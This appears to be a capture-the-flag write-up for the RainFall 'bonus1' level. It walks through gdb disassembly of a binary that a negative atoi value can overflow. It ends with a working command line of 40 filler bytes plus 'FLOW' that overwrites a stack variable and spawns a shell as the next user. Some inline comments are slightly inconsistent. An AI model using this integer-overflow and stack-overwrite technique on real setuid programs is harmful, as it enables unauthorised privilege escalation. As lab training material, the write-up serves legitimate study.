# Walkthrough

After examining the files in the home directory, I noticed a file named `"bonus1"`. I attempted to run it, but it didn't produce any results.

```sh
bonus1@RainFall:~$ ./bonus1 
Segmentation fault (core dumped)
bonus1@RainFall:~$ ./bonus1 AAAABBBBCCCC
bonus1@RainFall:~$ 
```

 Therefore, I proceeded to debug it using `gdb`. Firstly, I disassembled the `main` function and discovered that it accepts the `argv[1]` parameter from the `main` function.

```s
(gdb) disas main
Dump of assembler code for function main:
   0x08048424 <+0>: push   ebp
   0x08048425 <+1>: mov    ebp,esp
   0x08048427 <+3>: and    esp,0xfffffff0
   0x0804842a <+6>: sub    esp,0x40
   0x0804842d <+9>: mov    eax,DWORD PTR [ebp+0xc]
   0x08048430 <+12>: add    eax,0x4
   0x08048433 <+15>: mov    eax,DWORD PTR [eax]
   0x08048435 <+17>: mov    DWORD PTR [esp],eax
   0x08048438 <+20>: call   0x8048360 <atoi@plt>
   0x0804843d <+25>: mov    DWORD PTR [esp+0x3c],eax
   0x08048441 <+29>: cmp    DWORD PTR [esp+0x3c],0x9
   0x08048446 <+34>: jle    0x804844f <main+43>
   0x08048448 <+36>: mov    eax,0x1
   0x0804844d <+41>: jmp    0x80484a3 <main+127>
   0x0804844f <+43>: mov    eax,DWORD PTR [esp+0x3c]
   0x08048453 <+47>: lea    ecx,[eax*4+0x0]
   0x0804845a <+54>: mov    eax,DWORD PTR [ebp+0xc]
   0x0804845d <+57>: add    eax,0x8
   0x08048460 <+60>: mov    eax,DWORD PTR [eax]
   0x08048462 <+62>: mov    edx,eax
   0x08048464 <+64>: lea    eax,[esp+0x14]
   0x08048468 <+68>: mov    DWORD PTR [esp+0x8],ecx
   0x0804846c <+72>: mov    DWORD PTR [esp+0x4],edx
   0x08048470 <+76>: mov    DWORD PTR [esp],eax
   0x08048473 <+79>: call   0x8048320 <memcpy@plt>
   0x08048478 <+84>: cmp    DWORD PTR [esp+0x3c],0x574f4c46
   0x08048480 <+92>: jne    0x804849e <main+122>
   0x08048482 <+94>: mov    DWORD PTR [esp+0x8],0x0
   0x0804848a <+102>: mov    DWORD PTR [esp+0x4],0x8048580
   0x08048492 <+110>: mov    DWORD PTR [esp],0x8048583
   0x08048499 <+117>: call   0x8048350 <execl@plt>
   0x0804849e <+122>: mov    eax,0x0
   0x080484a3 <+127>: leave  
   0x080484a4 <+128>: ret    
End of assembler dump.
(gdb) x/s 0x8048583
```

  It then checks whether this parameter is less than or equal to `9` by converting it to an integer with the help of `atoi`. If it's false, the function returns 1,
  
  ```c
   0x0804842d <+9>: mov    eax,DWORD PTR [ebp+0xc]
   0x08048430 <+12>: add    eax,0x4
   0x08048433 <+15>: mov    eax,DWORD PTR [eax]
   0x08048435 <+17>: mov    DWORD PTR [esp],eax
   0x08048438 <+20>: call   0x8048360 <atoi@plt>
   0x0804843d <+25>: mov    DWORD PTR [esp+0x3c],eax // store the result of atoi in esp+0x3c
   0x08048441 <+29>: cmp    DWORD PTR [esp+0x3c],0x9
   0x08048446 <+34>: jle    0x804844f <main+43>
   0x08048448 <+36>: mov    eax,0x1
   0x0804844d <+41>: jmp    0x80484a3 <main+127>
   -------------------------------------------------------
   0x080484a3 <+127>: leave  
   0x080484a4 <+128>: ret    
  ```

  but if it's true, it copies the number (converted by atoi) multiplied by 4 bytes from `argv[2]` into a buffer using `memcpy`.

  ```c
   0x08048453 <+47>: lea    ecx,[eax*4+0x0] // eax contains the string converted to integer
   0x0804845a <+54>: mov    eax,DWORD PTR [ebp+0xc]
   0x0804845d <+57>: add    eax,0x8
   0x08048460 <+60>: mov    eax,DWORD PTR [eax] // argv [1]
   0x08048462 <+62>: mov    edx,eax
   0x08048464 <+64>: lea    eax,[esp+0x14] // buffer
   0x08048468 <+68>: mov    DWORD PTR [esp+0x8],ecx // 
   0x0804846c <+72>: mov    DWORD PTR [esp+0x4],edx
   0x08048470 <+76>: mov    DWORD PTR [esp],eax
   0x08048473 <+79>: call   0x8048320 <memcpy@plt>
  ```
  
  After that, it checks whether the converted number is not equal to `1464814662`. If it's true, the function returns 0. However, if it's false, it calls the `execl` function with the following parameters: `"/bin/sh"` - `"sh"` - `NULL`.

```c
   0x08048478 <+84>: cmp    DWORD PTR [esp+0x3c],0x574f4c46 // 1464814662 <=> "WOLF"
   0x08048480 <+92>: jne    0x804849e <main+122>
   0x08048482 <+94>: mov    DWORD PTR [esp+0x8],0x0
   0x0804848a <+102>: mov    DWORD PTR [esp+0x4],0x8048580
   0x08048492 <+110>: mov    DWORD PTR [esp],0x8048583
   0x08048499 <+117>: call   0x8048350 <execl@plt>
   0x0804849e <+122>: mov    eax,0x0
   0x080484a3 <+127>: leave  
   0x080484a4 <+128>: ret    
```

Subsequently, we can infer that in order to initiate a new shell process, we must save the number `0x574f4c46` in `esp+0x3c`. The issue, however, is that we cannot store a number that is greater than 9. As a result, we must find a method to overwrite the value in `esp+0x3c`. To begin, let's print the stack's contents after executing the program.

```c
(gdb) r 9 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
Starting program: /home/user/bonus1/bonus1 9 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
------------ stack ------------
0xbffff580:	0xbffff594	0xbffff7c8	0x00000024	0x080482fd
0xbffff590:	0xb7fd13e4	0x41414141	0x42424242	0x43434343
0xbffff5a0:	0x44444444	0x45454545	0x46464646	0x47474747
0xbffff5b0:	0x48484848	0x49494949	0x080484b9	0x00000009 // <== esp + 3c 
0xbffff5c0:	0x080484b0	0x00000000	0x00000000	0xb7e454d3

```

Upon observation, we noticed that we only copied to the value `0x49494949`, which is the equivalent of `"IIIII"`. This is because we previously stated that we only copied the size stored in `esp+0x3c` multiplied by 4, which is equivalent to shifting the number left by two `(<< 2)`, resulting in 36. Therefore, if we want to modify the value stored in `esp+0x3c`, we must copy at least 44 bytes.

To bypass the check for a value less than or equal to 9, we can enter a negative value. To do this, we can convert the number 11 to binary in 32-bit format:

```
> 11d = 00000000000000000000000000001011b
```
where the leftmost bit represents the sign of the number. If the leftmost bit is 0, then the number is positive. If it is 1, then the number is negative. We can change this bit to 1 to represent a negative value.

```
> 10000000000000000000000000001011b = -2147483637d
```

 Since we know that the value entered will be shifted left by 2 bits, we can see that all bits will be shifted left by 2 positions.

```
> 00000000000000000000000000101100b =  44
```

To execute the program with a negative value, we just need to change the first parameter to `-2147483637`, which is the decimal representation of the binary value we obtained by changing the leftmost bit of 11 to 1. Additionally, we need to enter a string with 40 characters followed by `"FLOW"` (which is equivalent to `0x574f4c46`) as the second parameter to the program.
```

```sh
bonus1@RainFall:~$  ./bonus1 -2147483637 `python2 -c 'print("A" * 40 + "FLOW")'`
$ whoami
bonus2
$ cd ../bonus2
$ ls -la
total 17
dr-xr-x---+ 1 bonus2 bonus2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 bonus2 bonus2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 bonus2 bonus2 3530 Sep 23  2015 .bashrc
-rw-r--r--+ 1 bonus2 bonus2   65 Sep 23  2015 .pass
-rw-r--r--  1 bonus2 bonus2  675 Apr  3  2012 .profile
-rwsr-s---+ 1 bonus3 users  5664 Mar  6  2016 bonus2
```